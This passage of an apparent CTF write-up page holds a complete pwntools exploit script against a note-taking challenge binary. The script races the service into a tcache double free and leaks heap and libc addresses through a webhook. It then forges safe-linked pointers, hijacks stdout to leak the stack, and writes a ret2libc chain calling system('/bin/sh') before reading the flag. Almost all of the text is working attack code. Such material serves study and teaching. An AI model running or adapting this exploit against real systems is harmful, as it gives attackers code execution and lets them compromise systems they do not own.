+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, str(mark)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> desc <span style="color:#f92672">!=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>:
+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, desc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove</span>(idx):
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">save</span>(idx, url):
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, url)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">change</span>(idx, mark, desc):
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> type(mark) <span style="color:#f92672">==</span> bytes:
+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, mark)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, str(mark)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> desc <span style="color:#f92672">!=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>:
+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, desc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># given a pointer generate mark and description </span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_mark_desc</span>(ptr):
+</span></span><span style="display:flex;"><span>    mark <span style="color:#f92672">=</span> ptr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+</span></span><span style="display:flex;"><span>    desc <span style="color:#f92672">=</span> p32((ptr <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">0xffff</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">32</span>)) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> mark, desc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># calculate safe-linked pointer</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_P1</span>(P, L):
+</span></span><span style="display:flex;"><span>    L12 <span style="color:#f92672">=</span> L <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>    P <span style="color:#f92672">=</span> P<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>    L12 <span style="color:#f92672">=</span> L12<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(bytes([p<span style="color:#f92672">^</span>l12 <span style="color:#66d9ef">for</span> p,l12 <span style="color:#f92672">in</span> zip(P,L12)])<span style="color:#f92672">.</span>hex(), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>        print(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Result&#34;</span>))
+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, input(<span style="color:#e6db74">&#34;Result: &#34;</span>)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># race condition to tcache-dup &amp; leak heap</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># -- start race --</span>
+</span></span><span style="display:flex;"><span>    save(<span style="color:#ae81ff">0</span>, WEBHOOK)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># change tcache-key (use &#34;-&#34; to keep chunk-&gt;fd untouched)</span>
+</span></span><span style="display:flex;"><span>    change(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;asdasdasdasdasd&#34;</span>)
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>) <span style="color:#75715e"># ensure requests arrive in the right order</span>
+</span></span><span style="display:flex;"><span>    save(<span style="color:#ae81ff">0</span>, WEBHOOK) <span style="color:#75715e"># leak heap</span>
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># -- end race -- </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># -- guess upper 4 bits of heap --</span>
+</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> int(requests<span style="color:#f92672">.</span>get(WEBHOOK<span style="color:#f92672">.</span>decode()<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;bodies.txt&#34;</span>)<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;mark=&#34;</span>)[<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>    heap <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> leak <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        heap <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0x100000000</span> <span style="color:#f92672">+</span> leak)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        heap <span style="color:#f92672">=</span> leak
+</span></span><span style="display:flex;"><span>    heap <span style="color:#f92672">=</span> heap <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># log.info(f&#34;partial heap: {hex(heap)}&#34;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># h_nibble = int(input(&#34;Guess the upper nibble: 0x&#34;).rjust(2, &#34;0&#34;), 16)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># usually 0x55 &lt;= (heap&gt;&gt;40) &lt;= 0x65</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (heap<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">40</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span>:
+</span></span><span style="display:flex;"><span>        h_nibble <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        h_nibble <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>    heap <span style="color:#f92672">=</span> (h_nibble<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">44</span>) <span style="color:#f92672">+</span> heap
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;heap: </span><span style="color:#e6db74">{</span>hex(heap)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># -------------------------------</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># undo tcache dup</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ======================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># create a big chunk and put it in unsortedbins</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># allocate from it a chunk </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># doing so we can partially leak libc without corrupting unsortedbins</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># then we need to consume the unsortedbin</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># in this way the thread can&#39;t allocate from it (avoid heap mess and crash)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># increase tcache count</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>        add(i, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>        remove(i)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># race to tcache-dup</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    save(<span style="color:#ae81ff">4</span>, WEBHOOK)
+</span></span><span style="display:flex;"><span>    change(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;asdasdasd&#34;</span>)
+</span></span><span style="display:flex;"><span>    remove(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># allocate a chunk above tcache_perthread_struct</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># this will be used to enlarge the chunk under it</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    tcache_metadata <span style="color:#f92672">=</span> calculate_P1(heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x80</span>, heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x6c0</span>)
+</span></span><span style="display:flex;"><span>    mark, desc <span style="color:#f92672">=</span> gen_mark_desc(tcache_metadata)
+</span></span><span style="display:flex;"><span>    change(<span style="color:#ae81ff">4</span>, mark, desc)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># allocate a chunk and one above it to change its size</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x430</span>) 
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>, payload) <span style="color:#75715e"># chunk above tcache_perthread_struct</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># small chunk to overlap and enlarge the one under it</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x410</span>) 
+</span></span><span style="display:flex;"><span>    change(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>, payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># enlarge</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x441</span>) 
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">6</span>, payload)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># put big chunk in unsortedbins</span>
+</span></span><span style="display:flex;"><span>    remove(<span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># add chunk from the one in unsortedbins (now we have 2 chunks pointing to libc)</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># we can save (free) one of them to leak 4 bytes of libc</span>
+</span></span><span style="display:flex;"><span>    save(<span style="color:#ae81ff">0</span>, WEBHOOK)
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> int(requests<span style="color:#f92672">.</span>get(WEBHOOK<span style="color:#f92672">.</span>decode()<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;bodies.txt&#34;</span>)<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;mark=&#34;</span>)[<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>    partial_libc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> leak <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        partial_libc <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0x100000000</span> <span style="color:#f92672">+</span> leak)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        partial_libc <span style="color:#f92672">=</span> leak
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;partial libc: </span><span style="color:#e6db74">{</span>hex(partial_libc)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># -- consume unsortedbin --</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>        add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+</span></span><span style="display:flex;"><span>        add(i, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># add entries to 0x40 tcache</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+</span></span><span style="display:flex;"><span>        remove(i)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># -------------------------</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ======================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># create a big chunk over tcache_perthread_struct </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># and put it in unsorted bin</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># now we have a libc pointer as first entry in 0x40 tcache</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># then partial override that ptr to make it point to stdout</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># allocate a chunk precisely over 0x40 tcache entry in tcache_perthread_struct</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># it&#39;s size will be changed by the chunk above</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0xa0</span>) 
+</span></span><span style="display:flex;"><span>    change(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>, payload)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># enlarge</span>
+</span></span><span style="display:flex;"><span>    change(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>, p32(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>flat(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x4f1</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># free it (to unsortedbins) </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># to have a libc ptr as first entry on 0x40 tcache</span>
+</span></span><span style="display:flex;"><span>    remove(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># calulate partial stdout from leaked libc bytes</span>
+</span></span><span style="display:flex;"><span>    partial_stdout <span style="color:#f92672">=</span> (partial_libc <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffff000</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x780</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># partial override libc address to allocate over stdout</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>flat(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x4b1</span>)<span style="color:#f92672">+</span>p32(partial_stdout)
+</span></span><span style="display:flex;"><span>    change(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ======================================================</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#75715e"># chunk over stdout</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># partial override _IO_write_base to leak libc</span>
+</span></span><span style="display:flex;"><span>    mark <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfbad1887</span>
+</span></span><span style="display:flex;"><span>    desc <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p32(partial_stdout<span style="color:#f92672">-</span><span style="color:#ae81ff">0x100</span>)
+</span></span><span style="display:flex;"><span>    change(<span style="color:#ae81ff">5</span>, mark, desc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21a6a0</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc: </span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ======================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># leak environ abusing stdout as read primitive</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    mark <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfbad1887</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># _IO_write_base = _IO_read_end = environ</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># _IO_write_ptr = environ+0x100</span>
+</span></span><span style="display:flex;"><span>    desc <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>environ) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>environ) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>environ<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>)
+</span></span><span style="display:flex;"><span>    change(<span style="color:#ae81ff">5</span>, mark, desc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    stack <span style="color:#f92672">=</span> u64(r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x148</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;stack: </span><span style="color:#e6db74">{</span>hex(stack)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ======================================================</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># change tcache metadata to allocate over retaddr of add_mark function</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># then write a ret2libc on the stack</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># change tcache_perthread_struct using previously allocated chunk</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>flat(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x511</span>)<span style="color:#f92672">+</span>p64(stack)
+</span></span><span style="display:flex;"><span>    change(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ret2libc on the stack</span>
+</span></span><span style="display:flex;"><span>    POP_RDI_RET <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2a3e5</span>
+</span></span><span style="display:flex;"><span>    RET <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf41c9</span>
+</span></span><span style="display:flex;"><span>    BINSH <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1d8698</span>
+</span></span><span style="display:flex;"><span>    ret2libc <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> flat(POP_RDI_RET, BINSH, RET, libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>, ret2libc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ======================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;pwned :)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cat flag&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(flag)
+</span></span><span style="display:flex;"><span>
